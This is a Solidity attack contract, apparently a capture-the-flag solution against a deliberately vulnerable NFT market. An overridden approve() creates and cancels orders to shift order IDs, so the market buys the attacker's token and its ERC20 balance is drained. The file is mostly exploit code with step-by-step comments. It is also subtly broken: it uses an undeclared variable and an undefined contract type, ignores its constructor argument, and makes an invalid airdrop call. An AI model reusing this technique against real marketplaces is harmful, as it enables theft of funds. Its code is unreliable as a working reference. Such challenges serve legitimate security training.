// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "../CTF5/VulnerableMarket.sol";

contract AttackerNFT is ERC721, Ownable {
    constructor() ERC721("VulnerableMarketAttackerNFT", "VMANFT") {
        _setApprovalForAll(address(this), msg.sender, true);
    }

    function mint(address to, uint256 tokenId) external onlyOwner {
        _mint(to, tokenId);
    }

    function setApproval(address _address) public {
        _setApprovalForAll(address(this), _address, true);
    }

    // Override of ERC721 approve function (Called on NFT ID 2)
    function approve(address to, uint256 tokenId) public override {
        // Step 3: We create a sell order for our token at price 1337
        vulnerableMarket.createOrder(address(this), 2, 1337); 
        // Actual state or orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337), (vmaNFT, NFT 1, 10), (vmaNFT, NFT 2, 1337)]
        // And now we just delete it
        vulnerableMarket.cancelOrder(3); 
        // New state or orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337), (vmaNFT, NFT 2, 1337)]
        // However, inside the purchaseTest function the order ID is 3, so the VulnerableMarket contract will buy our NFT for 1337
    }
}

contract Attacker{
    VulnerableMarket internal vulnerableMarket;
    ThreeSigmaToken internal threeSigmaToken;
    ThreeSigmaNFT internal threeSigmaNFT;

    VulnerableMarketAttackerNFT public vmaNFT;

    constructor(address _vulnerableMarketAddress)  public payable {
        vulnerableMarket = new VulnerableMarket();
        threeSigmaToken = new ThreeSigmaToken();
        threeSigmaNFT = new ThreeSigmaNFT();
        
        // First we get the airdrop for the ThreeSigmaTokens
        vulnerableMarket.tsToken.airdrop();

        // We get our attack token
        vmaNFT = new AttackerNFT();
        vmaNFT.mint(address(vmaNFT), 1);
        vmaNFT.mint(address(vmaNFT), 2);
    }

    function attack() payable public {
        // NFT ID 1: We can buy it for 1 ThreeSigmaToken
        vulnerableMarket.purchaseOrder(1); 

        // NFT ID 2: Amount of ERC20 tokens of the contract (Steal the tokens, the market has to buy it for us) -> purchaseTest
        // Initial state of orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337)]

        // Step 1: Approve the transfers of our attack NFT and send it to the VulnerableMarketContract
        vmaNFT.setApproval(address(vulnerableMarket));
        vmaNFT.safeTransferFrom(address(this), address(vulnerableMarket), 1);

        // Step 2: Call the purchaseTest function with the vmaNFT address that we just passed to the VulnerableMarket -> This will create a new order
        // Actual state or orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337), (vmaNFT, NFT 1, 10)]
        vulnerableMarket.purchaseTest(address(vmaNFT), 1, 10); // No need to, we can just pass 1337 and take the tokens straight away
        // New state or orders -> [(tsNFT, NFT 3, 13333337), (tsNFT, NFT 2, 1337)]
        // After all we would get 1337 tsTokens and now we can buy the NFT 2
        vulnerableMarket.purchaseOrder(2); 

        // NFT ID 3: We need to change the price -> purchaseWithCoupon
        //vulnerableMarket.purchaseWithCoupon(3); 
    }

    function checkOwner(uint256 tokenId) public view returns (address){
        IERC721 nft = IERC721(address(threeSigmaToken));
        return nft.ownerOf(tokenId);
    }
}